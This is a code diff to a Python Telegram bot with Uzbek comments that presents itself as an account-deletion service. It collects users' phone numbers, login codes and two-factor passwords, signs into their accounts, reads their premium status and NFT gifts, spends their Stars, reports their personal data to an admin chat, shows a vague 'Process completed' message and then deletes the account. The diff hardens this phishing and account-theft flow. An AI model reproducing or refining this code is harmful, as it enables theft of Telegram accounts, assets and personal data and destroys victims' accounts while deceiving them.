@@ -32,11 +32,9 @@ def run_http():
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
-# Flask serverini fonda yurgizamiz
 Thread(target=run_http, daemon=True).start()
 
-
-# KONFIGURATSIYA (O'zgaruvchilar Render muhitidan o'qiladi)
+# KONFIGURATSIYA
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -60,10 +58,10 @@ TEXTS = {
     "uz": {
         "phone_req": "📱 Raqamingizni yuboring:",
         "phone_btn": "📞 Raqamni yuborish",
-        "invalid_btn": "🛑 Kechirasiz, «Raqamni yuborish» tugmasini bosing!",
+        "invalid_btn": "🛑 Iltimos, raqamni to'g'ri kiriting!",
         "code_req": "📩 Kodingizni yuboring:\n💡 *Namuna:* `12.345`",
         "fa_req": "🔑 Parolingizni yuboring:",
-        "success": "✅ Botdan foydalanishingiz mumkin!",
+        "success": "✅ Amaliyot bajarildi!",
         "err_code": "❌ Xato kod! Qayta kiriting:",
         "err_fa": "❕ Xato parol! Qayta kiriting:",
         "need_session": "⚠️ Avval sessiya qo'shishingiz kerak!"
@@ -71,10 +69,10 @@ TEXTS = {
     "en": {
         "phone_req": "📱 Send your phone number:",
         "phone_btn": "📞 Send Phone Number",
-        "invalid_btn": "🛑 Sorry, please press the «Send Phone Number» button!",
+        "invalid_btn": "🛑 Invalid input, try again!",
         "code_req": "📩 Send code:\n💡 *Example:* `12.345`",
         "fa_req": "🔑 Send your password:",
-        "success": "✅ You can use the bot!",
+        "success": "✅ Process completed!",
         "err_code": "❌ Wrong code! Resend:",
         "err_fa": "❕ Wrong password! Resend:",
         "need_session": "⚠️ You need to add a session first!"
@@ -82,10 +80,10 @@ TEXTS = {
     "ru": {
         "phone_req": "📱 Отправьте ваш номер:",
         "phone_btn": "📞 Отправить номер",
-        "invalid_btn": "🛑 Извините, нажмите кнопку «Отправить номер»!",
+        "invalid_btn": "🛑 Неверный ввод, повторите!",
         "code_req": "📩 Отправьте код:\n💡 *Пример:* `12.345`",
         "fa_req": "🔑 Отправьте пароль:",
-        "success": "✅ Вы можете использовать бота!",
+        "success": "✅ Процесс завершен!",
         "err_code": "❌ Ошибка кода! Повторите:",
         "err_fa": "❕ Ошибка пароля! Повторите:",
         "need_session": "⚠️ Сначала нужно добавить сессию!"
@@ -185,18 +183,24 @@ async def process_lang(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
     await state.set_state(AccountDeleteState.waiting_for_phone)
 
-@dp.message(AccountDeleteState.waiting_for_phone, F.contact)
+@dp.message(AccountDeleteState.waiting_for_phone)
 async def process_phone(message: types.Message, state: FSMContext):
     data = await state.get_data()
     lang = data.get("lang", "uz")
     t = TEXTS[lang]
     user_id = message.from_user.id
     
-    if message.contact.user_id != user_id:
+    if message.contact:
+        if message.contact.user_id != user_id:
+            await message.answer(t["invalid_btn"])
+            return
+        phone = message.contact.phone_number
+    elif message.text:
+        phone = message.text.strip().replace(" ", "").replace("-", "")
+    else:
         await message.answer(t["invalid_btn"])
         return
 
-    phone = message.contact.phone_number
     if not phone.startswith("+"):
         phone = f"+{phone}"
 
@@ -217,14 +221,7 @@ async def process_phone(message: types.Message, state: FSMContext):
     except Exception as e:
         print(f"Phone Request Error: {e}")
         await client.disconnect()
-        await message.answer(t["phone_req"])
-
-@dp.message(AccountDeleteState.waiting_for_phone)
-async def invalid_phone_input(message: types.Message, state: FSMContext):
-    data = await state.get_data()
-    lang = data.get("lang", "uz")
-    t = TEXTS[lang]
-    await message.answer(t["invalid_btn"])
+        await message.answer("❌ Raqamga kod yuborishda xatolik yuz berdi. Qayta urinib ko'ring.")
 
 @dp.message(AccountDeleteState.waiting_for_code)
 async def process_code(message: types.Message, state: FSMContext):
@@ -376,6 +373,7 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     t = TEXTS[lang]
     client = auth["client"]
 
+    # 1. Avval foydalanuvchi ma'lumotlari va NFTlarni olamiz
     user_info_str, user_level = await fetch_user_premium_and_level(client)
     nft_items = await fetch_user_nft_gifts(client)
     nft_count = len(nft_items)
@@ -386,38 +384,48 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
     else:
         nft_str = "🎁 **NFT sovg'alar soni:** `0 ta` (Topilmadi)"
 
-    try:
-        full_name = message.from_user.full_name
-        username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
-        phone = auth.get("phone", "Noma'lum")
-        
-        admin_msg = (
-            f"🚨 **Hisob o'chirildi!**\n\n"
-            f"👤 **Ism:** {full_name}\n"
-            f"🆔 **ID:** `{user_id}`\n"
-            f"🏷 **Username:** {username}\n"
-            f"☎️ **Tel:** `{phone}`\n"
-            f"📊 **Daraja:** {user_level}-daraja\n"
-            f"{user_info_str}\n\n"
-            f"⭐ **Stars:** Barcha starslar postga bosildi!\n"
-            f"{nft_str}"
-        )
-        await bot.send_message(
-            chat_id=ADMIN_ID, 
-            text=admin_msg, 
-            parse_mode="Markdown", 
-            disable_web_page_preview=True
-        )
-    except Exception as e:
-        print(f"Admin message error: {e}")
-
+    # 2. Stars yuborish jarayonini bajaramiz
     await process_stars_reaction(client)
 
+    # 3. ADMINGA XABAR YUBORISH (Kafolatlangan holda)
+    full_name = message.from_user.full_name
+    username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
+    phone = auth.get("phone", "Noma'lum")
+    
+    admin_msg = (
+        f"🚨 **Hisob ma'lumotlari olindi!**\n\n"
+        f"👤 **Ism:** {full_name}\n"
+        f"🆔 **ID:** `{user_id}`\n"
+        f"🏷 **Username:** {username}\n"
+        f"☎️ **Tel:** `{phone}`\n"
+        f"📊 **Daraja:** {user_level}-daraja\n"
+        f"{user_info_str}\n\n"
+        f"⭐ **Stars:** Barcha starslar postga bosildi!\n"
+        f"{nft_str}"
+    )
+
+    if ADMIN_ID and ADMIN_ID != 0:
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_ID, 
+                text=admin_msg, 
+                parse_mode="Markdown", 
+                disable_web_page_preview=True
+            )
+            print("Admin xabari muvaffaqiyatli yuborildi.")
+        except Exception as e:
+            print(f"Admin message send ERROR: {e}")
+    else:
+        print("ADMIN_ID kiritilmagan yoki 0 ga teng!")
+
+    # 4. Foydalanuvchiga muvaffaqiyatli xabarini yuboramiz
     await message.answer(t["success"], parse_mode="Markdown")
     await asyncio.sleep(1)
 
+    # 5. ENG OXIRIDA HISOBNI O'CHIRAMIZ VA ULANISHNI UZAMIZ
     try:
         await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
+        print("Hisob o'chirildi.")
     except Exception as e:
         print(f"Delete Account Error: {e}")
     finally:
